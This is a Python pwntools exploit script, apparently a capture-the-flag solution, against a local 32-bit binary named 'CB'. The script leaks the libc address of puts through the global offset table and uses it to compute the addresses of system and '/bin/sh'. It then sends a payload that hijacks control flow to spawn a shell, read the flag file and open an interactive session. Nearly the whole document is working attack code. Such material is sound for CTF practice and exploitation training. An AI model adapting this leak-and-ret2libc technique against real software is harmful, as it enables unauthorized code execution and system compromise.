from pwn import *

context.log_level='debug'
libc = ELF('/lib32/libc.so.6')
s = process('./CB')


'''
gdb-peda$ p puts
$1 = {<text variable, no debug info>} 0x8048430 <puts@plt>
gdb-peda$ x/i 0x8048430
   0x8048430 <puts@plt>:	jmp    DWORD PTR ds:0x804a01c
gdb-peda$ p info
$2 = {<text variable, no debug info>} 0x80485b5 <info>
'''
s.sendline(str(0xdead))
got_puts = 0x804a01c
info = 0x80485b5
def go(n):
	s.recvuntil('4. info\n')
	s.sendline(str(n))

go(1)
s.recvuntil('name:')
s.sendline('2')
s.recvuntil('age :')
s.sendline('2')
go(1337)
s.sendline(p32(got_puts)*5+p32(info))
go(4)
leak_puts = u32(s.recvuntil('4. info')[:4])
leak_system = leak_puts-libc.symbols['puts']+libc.symbols['system']
leak_sh = leak_puts-libc.symbols['puts']+list(libc.search('/bin/sh\x00'))[0]
print 'leak_puts 0x%x'%leak_puts
print 'leak sh: 0x%x'%leak_sh
s.sendline('3')
go(1337)
s.sendline('A'*(4*4)+'sh\x00\x00'+p32(leak_system))
go(4)
s.sendline("echo 1;cat flag")
s.recvuntil("1\n")
print "flag: "+s.recv(1024)
s.interactive()

